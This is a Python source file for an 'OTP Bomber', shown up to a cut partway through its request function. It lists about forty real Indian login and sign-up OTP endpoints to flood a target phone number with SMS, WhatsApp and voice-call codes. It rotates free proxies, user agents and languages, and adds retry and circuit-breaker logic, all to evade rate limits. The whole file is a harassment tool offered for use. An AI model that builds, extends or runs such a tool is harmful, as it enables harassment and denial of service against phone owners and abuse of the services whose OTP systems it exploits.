"""
OTP Bomber — tapas.py  (v3 — deep rewrite)
============================================
• Auto-rotating free-proxy pool (no config needed)
• 40 real Indian OTP endpoints  📱 SMS · 💬 WhatsApp · 📞 Call
• JSON + form-encoded payloads both supported
• Per-API custom success-pattern override
• Adaptive circuit-breaker + exponential back-off retry
• Direct fallback guaranteed on every proxy failure
"""

import asyncio
import aiohttp
import random
import logging
import time as _time
import re
from typing import Optional

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════════
# ─── FREE ROTATING PROXY POOL ─────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=6000&country=IN,US,SG,GB&ssl=all&anonymity=elite",
    "https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=IN",
    "https://www.proxy-list.download/api/v1/get?type=https&anon=elite&country=IN",
    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&country=IN&protocols=http,https&speed=fast&filterUpTime=80",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
]

TEST_URL      = "https://httpbin.org/ip"
PROXY_TIMEOUT = 8
MIN_POOL_SIZE = 5
REFRESH_EVERY = 300


class ProxyPool:
    def __init__(self):
        self._pool:         list[str] = []
        self._bad:          set[str]  = set()
        self._idx:          int       = 0
        self._last_refresh: float     = 0.0
        self._refreshing:   bool      = False
        self._lock = asyncio.Lock()

    async def _fetch_raw(self, session: aiohttp.ClientSession, url: str) -> list[str]:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=12)) as r:
                if r.status != 200:
                    return []
                text = await r.text()
        except Exception:
            return []

        proxies = []
        if text.strip().startswith("{"):
            try:
                import json
                data = json.loads(text)
                for item in data.get("data", []):
                    ip, port = item.get("ip", ""), item.get("port", "")
                    if ip and port:
                        proxies.append(f"{ip}:{port}")
            except Exception:
                pass
            return proxies

        for line in text.splitlines():
            line = line.strip()
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$", line):
                proxies.append(line)
        return proxies

    async def _test_proxy(self, proxy: str) -> bool:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(
                    TEST_URL,
                    proxy=f"http://{proxy}",
                    timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT),
                    ssl=False,
                ) as r:
                    return r.status == 200
        except Exception:
            return False

    async def refresh(self, force: bool = False):
        async with self._lock:
            now = _time.monotonic()
            if not force and (now - self._last_refresh) < REFRESH_EVERY:
                return
            if self._refreshing:
                return
            self._refreshing = True

        logger.info("🔄 Fetching fresh proxy pool …")
        raw: list[str] = []
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                batches = await asyncio.gather(
                    *[self._fetch_raw(s, url) for url in PROXY_SOURCES],
                    return_exceptions=True,
                )
                for b in batches:
                    if isinstance(b, list):
                        raw.extend(b)

            raw = list({p for p in raw if p not in self._bad})
            random.shuffle(raw)
            candidates = raw[:100]
            logger.info(f"🔍 Testing {len(candidates)} proxies …")
            results = await asyncio.gather(
                *[self._test_proxy(p) for p in candidates],
                return_exceptions=True,
            )
            working = [p for p, ok in zip(candidates, results) if ok is True]
            logger.info(f"✅ {len(working)} working proxies")
            async with self._lock:
                self._pool         = working
                self._idx          = 0
                self._last_refresh = _time.monotonic()
                self._refreshing   = False
        except Exception as exc:
            logger.warning(f"⚠️ Proxy refresh error: {exc}")
            async with self._lock:
                self._refreshing = False

    def next(self) -> Optional[str]:
        if not self._pool:
            return None
        proxy = self._pool[self._idx % len(self._pool)]
        self._idx += 1
        return proxy

    def mark_bad(self, proxy: str):
        self._bad.add(proxy)
        if proxy in self._pool:
            self._pool.remove(proxy)

    def size(self) -> int:
        return len(self._pool)

    async def ensure_ready(self):
        if self.size() < MIN_POOL_SIZE:
            await self.refresh(force=True)


_proxy_pool = ProxyPool()


async def refresh_proxy_pool():
    await _proxy_pool.refresh(force=True)
    logger.info(f"🔀 Proxy pool size: {_proxy_pool.size()}")
    return []


# ─── User-Agent Pool ──────────────────────────────────────────────────────────

_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
]

_ACCEPT_LANGS = [
    "en-IN,en;q=0.9,hi;q=0.8",
    "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,hi;q=0.7",
    "en-IN,en;q=0.8",
]


def _rand_ua():   return random.choice(_UA_POOL)
def _rand_lang(): return random.choice(_ACCEPT_LANGS)


# ═══════════════════════════════════════════════════════════════════════════════
# ─── API DEFINITIONS ──────────────────────────────────────────────────────────
#
#  Fields:
#   name          str   display name
#   kind          str   "sms" | "whatsapp" | "call"
#   url           str   endpoint URL  ({phone} / {phone_cc} substituted)
#   method        str   "POST" | "GET"
#   json          dict  JSON body  (use this OR data, not both)
#   data          dict  form-encoded body
#   register_json dict  alternate JSON body (sent in parallel)
#   register_data dict  alternate form body
#   base_headers  dict  headers merged with random UA / Accept-Language
#   ok_hint       str   substring that means success for this specific API
# ═══════════════════════════════════════════════════════════════════════════════

APIS = [

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS
    # ══════════════════════════════════════════════════════════════════════════

    # ── Payments / Fintech ─────────────────────────────────────────────────────
    {
        "name": "Paytm",
        "kind": "sms",
        "url":  "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
                 "version": "v1", "locale": "en_IN"},
        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
                          "version": "v1", "locale": "en_IN", "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://paytm.com",
            "Referer": "https://paytm.com/",
            "X-Channel": "web",
            "X-Requested-With": "XMLHttpRequest",
        },
        "ok_hint": "response_code",
    },
    {
        "name": "PhonePe",
        "kind": "sms",
        "url":  "https://api.phonepe.com/apis/hermes/v3/user/authenticate",
        "method": "POST",
        "json": {"mobileNumber": "{phone}", "merchantId": "PHONEPE", "countryCode": "+91"},
        "register_json": {"mobileNumber": "{phone}", "merchantId": "PHONEPE",
                          "countryCode": "+91", "newUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.phonepe.com",
            "Referer": "https://www.phonepe.com/",
        },
    },
    {
        "name": "MobiKwik",
        "kind": "sms",
        "url":  "https://www.mobikwik.com/api/v2/user/login/mobile",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.mobikwik.com",
            "Referer": "https://www.mobikwik.com/",
        },
    },

    # ── E-Commerce ─────────────────────────────────────────────────────────────
    {
        "name": "Flipkart",
        "kind": "sms",
        "url":  "https://www.flipkart.com/api/4/user/mobilelogin/otp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}"},
        "register_json": {"mobileNumber": "{phone}", "newUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.flipkart.com",
            "Referer": "https://www.flipkart.com/",
            "X-User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 FKUA/website/42/website/Desktop",
        },
    },
    {
        "name": "Meesho",
        "kind": "sms",
        "url":  "https://meesho.com/api/v1/users/otp",
        "method": "POST",
        "json": {"phone_number": "{phone}"},
        "register_json": {"phone_number": "{phone}", "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.meesho.com",
            "Referer": "https://www.meesho.com/",
        },
    },
    {
        "name": "Myntra",
        "kind": "sms",
        "url":  "https://www.myntra.com/gateway/v2/user/authenticate",
        "method": "POST",
        "json": {"username": "{phone}", "sendOTP": True},
        "register_json": {"username": "{phone}", "sendOTP": True, "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.myntra.com",
            "Referer": "https://www.myntra.com/",
            "X-Requested-With": "XMLHttpRequest",
        },
    },
    {
        "name": "Ajio",
        "kind": "sms",
        "url":  "https://www.ajio.com/api/j/26401/users/token",
        "method": "POST",
        "json": {"loginId": "{phone}", "password": ""},
        "register_json": {"loginId": "{phone}", "password": "", "action": "register"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.ajio.com",
            "Referer": "https://www.ajio.com/",
        },
    },
    {
        "name": "Nykaa",
        "kind": "sms",
        "url":  "https://www.nykaa.com/api/auth/sendOtp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}"},
        "register_json": {"mobileNumber": "{phone}", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.nykaa.com",
            "Referer": "https://www.nykaa.com/",
        },
    },
    {
        "name": "JioMart",
        "kind": "sms",
        "url":  "https://www.jiomart.com/api/customer/v2/mobile/otp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}"},
        "register_json": {"mobileNumber": "{phone}", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.jiomart.com",
            "Referer": "https://www.jiomart.com/",
        },
    },

    # ── Food & Grocery Delivery ────────────────────────────────────────────────
    {
        "name": "Swiggy",
        "kind": "sms",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
            "tid": "randomtid",
        },
        "ok_hint": "is_new_user",
    },
    {
        "name": "Zomato",
        "kind": "sms",
        "url":  "https://www.zomato.com/webroutes/user/login",
        "method": "POST",
        "json": {"number": "{phone}", "country_id": 1, "otp_type": "SMS"},
        "register_json": {"number": "{phone}", "country_id": 1, "otp_type": "SMS",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.zomato.com",
            "Referer": "https://www.zomato.com/",
            "x-zomato-csrft": "1",
        },
    },
    {
        "name": "BigBasket",
        "kind": "sms",
        "url":  "https://www.bigbasket.com/mapi/v1/user/mobile_verify/?ver=1&aud=online&type=bb",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "is_new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.bigbasket.com",
            "Referer": "https://www.bigbasket.com/",
            "X-Requested-With": "XMLHttpRequest",
        },
    },
    {
        "name": "Blinkit",
        "kind": "sms",
        "url":  "https://blinkit.com/v4/user/generate_otp",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://blinkit.com",
            "Referer": "https://blinkit.com/",
            "app_client": "web",
            "X-Requested-With": "XMLHttpRequest",
        },
    },
    {
        "name": "Zepto",
        "kind": "sms",
        "url":  "https://node-api.zepto.co.in/v1/user/otp/send",
        "method": "POST",
        "json": {"phone": "{phone}", "type": "LOGIN"},
        "register_json": {"phone": "{phone}", "type": "SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.zepto.co.in",
            "Referer": "https://www.zepto.co.in/",
        },
    },
    {
        "name": "Licious",
        "kind": "sms",
        "url":  "https://api.licious.in/user/v1/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "newUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.licious.in",
            "Referer": "https://www.licious.in/",
        },
    },
    {
        "name": "FreshToHome",
        "kind": "sms",
        "url":  "https://www.freshtohome.com/api/customer/sendotp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91"},
        "register_json": {"mobile": "{phone}", "countryCode": "91"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.freshtohome.com",
            "Referer": "https://www.freshtohome.com/",
        },
    },
    {
        "name": "CountryDelight",
        "kind": "sms",
        "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "is_new": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.countrydelight.in",
            "Referer": "https://www.countrydelight.in/",
        },
    },

    # ── Healthcare / Medicine ──────────────────────────────────────────────────
    {
        "name": "PharmEasy",
        "kind": "sms",
        "url":  "https://pharmeasy.in/api/auth/v4/sendOtp",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "flow": "signup"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://pharmeasy.in",
            "Referer": "https://pharmeasy.in/",
        },
    },
    {
        "name": "Tata1mg",
        "kind": "sms",
        "url":  "https://www.1mg.com/pharmacy_api_gateway/v2/users/otp",
        "method": "POST",
        "json": {"phone": "{phone}", "countryCode": "+91"},
        "register_json": {"phone": "{phone}", "countryCode": "+91", "newUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.1mg.com",
            "Referer": "https://www.1mg.com/",
            "X-APP-CLIENT": "web",
        },
    },
    {
        "name": "Practo",
        "kind": "sms",
        "url":  "https://www.practo.com/api/v1/profiles/otp",
        "method": "POST",
        "json": {"phone_number": "{phone}", "country_code": "+91"},
        "register_json": {"phone_number": "{phone}", "country_code": "+91",
                          "action": "signup"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.practo.com",
            "Referer": "https://www.practo.com/",
        },
    },

    # ── Travel ─────────────────────────────────────────────────────────────────
    {
        "name": "MakeMyTrip",
        "kind": "sms",
        "url":  "https://www.makemytrip.com/api/mmy/user/login/v1",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91", "sendOtp": True},
        "register_json": {"mobile": "{phone}", "countryCode": "91", "sendOtp": True,
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.makemytrip.com",
            "Referer": "https://www.makemytrip.com/",
            "dc": "IN",
            "currency": "INR",
            "locale": "en-IN",
        },
    },
    {
        "name": "Goibibo",
        "kind": "sms",
        "url":  "https://www.goibibo.com/api/gommt/gologin/v1/sendOTP",
        "method": "POST",
        "json": {"mobileNo": "{phone}", "countryCode": "+91"},
        "register_json": {"mobileNo": "{phone}", "countryCode": "+91", "isNew": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.goibibo.com",
            "Referer": "https://www.goibibo.com/",
        },
    },
    {
        "name": "EaseMyTrip",
        "kind": "sms",
        "url":  "https://api.easemytrip.com/Account/SendOTP",
        "method": "POST",
        "json": {"mobileNo": "{phone}", "countryCode": "91"},
        "register_json": {"mobileNo": "{phone}", "countryCode": "91", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.easemytrip.com",
            "Referer": "https://www.easemytrip.com/",
        },
    },
    {
        "name": "BookMyShow",
        "kind": "sms",
        "url":  "https://in.bookmyshow.com/api/1.0/auth/otplogin",
        "method": "POST",
        "json": {"mobileNo": "{phone}", "countryCode": "+91"},
        "register_json": {"mobileNo": "{phone}", "countryCode": "+91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://in.bookmyshow.com",
            "Referer": "https://in.bookmyshow.com/",
            "x-bms-id": "application/json, text/plain, */*",
        },
    },

    # ── Home Services / Others ─────────────────────────────────────────────────
    {
        "name": "UrbanCompany",
        "kind": "sms",
        "url":  "https://www.urbancompany.com/v7/consumer/send_otp/",
        "method": "POST",
        "json": {"phone": "{phone}", "dial_code": "+91"},
        "register_json": {"phone": "{phone}", "dial_code": "+91",
                          "is_new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.urbancompany.com",
            "Referer": "https://www.urbancompany.com/",
        },
    },
    {
        "name": "Dunzo",
        "kind": "sms",
        "url":  "https://api.dunzo.com/api/auth/otp/",
        "method": "POST",
        "json": {"phone_number": "+91{phone}"},
        "register_json": {"phone_number": "+91{phone}", "is_signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.dunzo.com",
            "Referer": "https://www.dunzo.com/",
        },
    },

    # ── Education ──────────────────────────────────────────────────────────────
    {
        "name": "Vedantu",
        "kind": "sms",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "LOGIN"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "type": "SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
    },

    # ── Investment / Finance ───────────────────────────────────────────────────
    {
        "name": "Groww",
        "kind": "sms",
        "url":  "https://groww.in/v1/api/user/login/verification/initiate",
        "method": "POST",
        "json": {"mobileNumber": "{phone}", "countryCode": "91"},
        "register_json": {"mobileNumber": "{phone}", "countryCode": "91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://groww.in",
            "Referer": "https://groww.in/",
            "x-meta-app": '{"clientId":"WEB"}',
        },
    },

    # ── Insurance ─────────────────────────────────────────────────────────────
    {
        "name": "PolicyBazaar",
        "kind": "sms",
        "url":  "https://www.policybazaar.com/auth/api/user/otp/",
        "method": "POST",
        "json": {"mobile": "{phone}", "type": "login"},
        "register_json": {"mobile": "{phone}", "type": "register"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.policybazaar.com",
            "Referer": "https://www.policybazaar.com/",
        },
    },

    # ── Entertainment / Audio ──────────────────────────────────────────────────
    {
        "name": "KukuFM",
        "kind": "sms",
        "url":  "https://kukufm.com/api/v2.3/user/generate_otp/",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}", "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://kukufm.com",
            "Referer": "https://kukufm.com/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 💬  WHATSAPP
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Paytm-WA",
        "kind": "whatsapp",
        "url":  "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
                 "version": "v1", "medium": "whatsapp", "locale": "en_IN"},
        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
                          "version": "v1", "medium": "whatsapp", "locale": "en_IN",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://paytm.com",
            "Referer": "https://paytm.com/",
            "X-Channel": "web",
        },
        "ok_hint": "response_code",
    },
    {
        "name": "Swiggy-WA",
        "kind": "whatsapp",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "whatsapp"},
        "register_json": {"mobile": "{phone}", "medium": "whatsapp"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
        "ok_hint": "is_new_user",
    },
    {
        "name": "Vedantu-WA",
        "kind": "whatsapp",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "WHATSAPP"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "type": "WHATSAPP_SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
    },
    {
        "name": "Meesho-WA",
        "kind": "whatsapp",
        "url":  "https://meesho.com/api/v1/users/otp",
        "method": "POST",
        "json": {"phone_number": "{phone}", "medium": "whatsapp"},
        "register_json": {"phone_number": "{phone}", "medium": "whatsapp",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.meesho.com",
            "Referer": "https://www.meesho.com/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📞  CALL  (IVR / Voice OTP)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Paytm-Call",
        "kind": "call",
        "url":  "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
                 "version": "v1", "medium": "ivr", "locale": "en_IN"},
        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
                          "version": "v1", "medium": "ivr", "locale": "en_IN",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://paytm.com",
            "Referer": "https://paytm.com/",
            "X-Channel": "web",
        },
        "ok_hint": "response_code",
    },
    {
        "name": "Vedantu-Call",
        "kind": "call",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "type": "VOICE_SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
    },
    {
        "name": "Swiggy-Call",
        "kind": "call",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "voice"},
        "register_json": {"mobile": "{phone}", "medium": "voice"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
        "ok_hint": "is_new_user",
    },
    {
        "name": "Flipkart-Call",
        "kind": "call",
        "url":  "https://www.flipkart.com/api/4/user/mobilelogin/otp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}", "otpType": "ivr"},
        "register_json": {"mobileNumber": "{phone}", "otpType": "ivr", "newUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.flipkart.com",
            "Referer": "https://www.flipkart.com/",
        },
    },
]

API_COUNT      = len(APIS)
SMS_COUNT      = sum(1 for a in APIS if a["kind"] == "sms")
WHATSAPP_COUNT = sum(1 for a in APIS if a["kind"] == "whatsapp")
CALL_COUNT     = sum(1 for a in APIS if a["kind"] == "call")


# ─── Circuit breaker ──────────────────────────────────────────────────────────

CIRCUIT_THRESHOLD = 3
COOLDOWN_SEC      = 20.0

_api_fail_count:     dict[str, int]   = {}
_api_cooldown_until: dict[str, float] = {}


def _is_cooled(name: str) -> bool:
    return _time.monotonic() < _api_cooldown_until.get(name, 0.0)


def _record_fail(name: str):
    _api_fail_count[name] = _api_fail_count.get(name, 0) + 1
    if _api_fail_count[name] >= CIRCUIT_THRESHOLD:
        _api_cooldown_until[name] = _time.monotonic() + COOLDOWN_SEC
        _api_fail_count[name] = 0
        logger.info(f"🔴 [{name}] Circuit open — cooling {COOLDOWN_SEC}s")


def _record_ok(name: str):
    _api_fail_count[name] = 0
    _api_cooldown_until.pop(name, None)


# ─── Response analysis ────────────────────────────────────────────────────────

_FAIL_PATTERNS = (
    '"success":false', '"success": false',
    '"status":"error"', '"status": "error"',
    '"status":"fail"', '"status":"failed"',
    '"error":true', '"iserror":true',
    "invalid mobile", "invalid number", "invalid phone number",
    "captcha required", "captcha_required", "recaptcha",
    "too many request", "rate limit", "rate_limit", "throttle",
    "access denied", '"forbidden"',
    '"statuscode":400', '"statuscode":429', '"statuscode":401', '"statuscode":403',
    '"code":400', '"code":429', '"code":401', '"code":403',
    '"statusCode":400', '"statusCode":429', '"statusCode":401', '"statusCode":403',
    '"httpstatus":400', '"httpstatus":401', '"httpstatus":403', '"httpstatus":429',
    "otp not sent", "could not send", "failed to send",
    '"result":"fail"', '"result":"failure"',
    "phone number not valid", "mobile not valid",
    "number is invalid", "not a valid mobile",
)

_OK_PATTERNS = (
    # Boolean success flags
    '"success":true', '"success": true',
    '"status":"success"', '"status": "success"',
    '"status":"ok"', '"status": "ok"',
    '"result":"success"', '"result": "success"',
    # OTP sent flags
    '"smsSent":true', '"smsSent": true',
    '"sms_sent":true', '"otp_sent":true',
    '"otpSent":true', '"otpSent": true',
    '"whatsappSent":true', '"callSent":true',
    # Text patterns
    "otp sent", "otp has been sent", "successfully sent",
    "otp generated", "otp send successfully", "otp sent successfully",
    "message sent", "sms sent",
    # Message field patterns
    '"message":"otp', '"message": "otp',
    '"message":"success"', '"message": "success"',
    '"message":"sent"', '"msg":"otp',
    '"msg":"success"', '"msg":"sent"',
    # Auth/session tokens returned on success
    '"nonce":', '"tid":', '"token":', '"requestId":',
    '"session_id":', '"sessionId":',
    '"txnId":', '"transaction_id":',
    '"otp_reference":', '"reference_id":',
    '"otpId":', '"otp_id":',
    # Numeric status codes (many Indian APIs use these)
    '"statuscode":0', '"statusCode":0', '"code":0',
    '"statusCode":200', '"statusCode": 200',
    '"status":1', '"status": 1',
    '"status":200', '"status": 200',
    '"httpCode":200', '"httpCode": 200',
    '"http_status":200',
    # Paytm specific
    '"response_code":"success"', '"response_code": "success"',
    '"response":"otp', '"response": "otp',
    '"response_code":"SUCCESS"',
    # User identification (returned on successful OTP trigger)
    '"is_new_user":', '"user_exists":',
    '"mobile_verified":', '"phone_verified":',
    '"contactExist":', '"emailExists":',
    '"user_id":', '"userId":',
    # Data payload present (many return data:{...} on success)
    '"data":{',
)


def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
    stripped = body.strip()
    if stripped in ("", "(no body)"):
        return False
    low = stripped.lower()
    # HTML response → definitely not an OTP API success
    if low.startswith("<!doctype") or low.startswith("<html"):
        return False
    # Literal failure values
    if low in ("false", "null", "0", "undefined", "[]", "{}"):
        return False
    # Per-API hint check (fast-path before full scan)
    if ok_hint and ok_hint.lower() in low:
        # Only if no fail pattern overrides it
        ok_hint_found = True
    else:
        ok_hint_found = False
    # Fail patterns take priority
    for pat in _FAIL_PATTERNS:
        if pat.lower() in low:
            return False
    # Per-API hint → success (fail patterns already cleared above)
    if ok_hint_found:
        return True
    # Generic ok patterns
    for pat in _OK_PATTERNS:
        if pat.lower() in low:
            return True
    # Final heuristic: JSON 200/201 with OTP-related keywords
    if status in (200, 201) and len(stripped) > 10:
        if (stripped.startswith("{") or stripped.startswith("[")) and any(
            h in low for h in ["otp", "sent", "verify", "phone", "mobile",
                               "token", "session", "success", "sms", "message",
                               "nonce", "user", "login"]
        ):
            return True
    return False


def _is_rate_limited(body: str, status: int) -> bool:
    if status == 429:
        return True
    low = body.lower()
    return any(p in low for p in ("rate limit", "too many request", "throttle",
                                   "slow down", "retry after"))


# ─── Placeholder substitution ─────────────────────────────────────────────────

def _substitute(value, phone: str, phone_cc: str):
    if isinstance(value, str):
        return value.replace("{phone}", phone).replace("{phone_cc}", phone_cc)
    if isinstance(value, dict):
        return {k: _substitute(v, phone, phone_cc) for k, v in value.items()}
    if isinstance(value, list):
        return [_substitute(v, phone, phone_cc) for v in value]
    return value


# ─── Single HTTP request ─────────────────────────────────────────────────────
# Strategy: TRY DIRECT FIRST — then proxies if direct fails/rate-limits.
# This guarantees at least one real request always reaches the server.

MAX_PROXY_TRIES = 3


async def _fire_single(
    url: str, method: str, headers: dict,
    payload, name: str,
    form_encoded: bool = False,
    ok_hint: str = "",
):
    timeout = aiohttp.ClientTimeout(total=15, connect=7)
    kw_base: dict = dict(headers=headers, timeout=timeout, allow_redirects=True, ssl=False)
    if isinstance(payload, dict):
        if form_encoded:
            kw_base["data"] = payload
        else:
            kw_base["json"] = payload

    # Build attempt order: direct first, then up to MAX_PROXY_TRIES proxies
